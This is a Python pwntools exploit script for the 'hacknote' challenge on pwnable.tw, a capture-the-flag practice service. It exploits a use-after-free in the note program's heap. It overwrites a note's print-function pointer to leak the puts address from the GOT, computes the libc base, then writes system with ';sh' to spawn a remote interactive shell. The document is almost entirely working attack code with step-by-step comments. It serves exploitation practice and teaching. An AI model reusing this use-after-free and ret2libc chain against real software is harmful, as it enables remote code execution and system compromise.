# !/bin/python3
from pwn import *

context.arch = 'i386'
context.terminal = ['tmux','splitw','-h']

def choice(io, choi):
    io.recvuntil(b"Your choice :")
    io.sendline(f"{choi}".encode())

def add(io,size,content):
    choice(io,1)
    io.recvuntil(b"Note size :")
    io.sendline(f"{size}".encode())
    io.recvuntil(b"Content :")
    io.send(content)
    io.recvuntil(b"Success !")

def delete(io,idx):
    choice(io,2)
    io.recvuntil(b"Index :")
    io.sendline(f"{idx}".encode())
    # io.recvuntil(b"Success !")

def print_note(io,idx):
    choice(io,3)
    io.recvuntil(b"Index :")
    io.sendline(f"{idx}".encode())
    content = io.recvuntil(b"----------------------").strip(b"----------------------")
    return content

def leak_libc(io):
    choice()

def gdb_scripts(system_addr):
    scripts = f"set $system={system_addr}\n"
    scripts+= f"b *$system\n"
    scripts+= f"c"
    return scripts

DEBUG = False   

if __name__ == "__main__":
    if DEBUG:
        io = process("./hacknote")
    else:
        io = remote("chall.pwnable.tw",10102)
    _bin = ELF("./hacknote")
    libc = ELF("./libc_32.so.6")

    print_note_hook = 0x804862b
    puts_got = _bin.got['puts']

    # add 2 notes with size=0x10, idx=0,1, content: "/bin/sh\x00"
    # delete idx=0,idx=1
    # add 1 note with size = 0x8, idx=2, this note control the print_note_hook and content_ptr of note(idx=0) 
    # modified note(idx=2) content to | print_note_hook | GOT['puts'] |
    # print_note(idx=0), then the address of puts will leak, as well as libc
    # delete(idx=2), then bin->meta_chunk->content_chunk
    # add 1 note with size = 0x8, idx=3, this note control the print_note_hook and content_ptr of note(idx=3)
    # set idx=3' content to | system | bin_sh_addr |

    add(io,0x10,b"/bin/sh\x00")
    add(io,0x10,b"/bin/sh\x00")
    delete(io,0)
    delete(io,1)
    add(io,0x8,p32(print_note_hook) + p32(puts_got))
    # leak libc
    puts_addr = print_note(io,0)[:4]
    puts_addr = u32(puts_addr.ljust(4,b'\x00'))
    print("puts_addr: ", hex(puts_addr))
    libc.address = puts_addr - libc.symbols["puts"]
    print("leaked libc:",hex(libc.address))
    # hack
    delete(io,2)
    system_addr = libc.symbols["system"]
    gets_addr = libc.symbols["gets"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    print("system at:",hex(system_addr))
    print("binsh at:",hex(binsh))

    #gdb.attach(pidof(io)[0],gdbscript=gdb_scripts(system_addr))
    #sleep(1)
    add(io,0x8,p32(system_addr)+b";sh\x00")
    #gdb.attach(pidof(io)[0],gdbscript=gdb_scripts(system_addr))
    # print(print_note(io,0))
    io.interactive()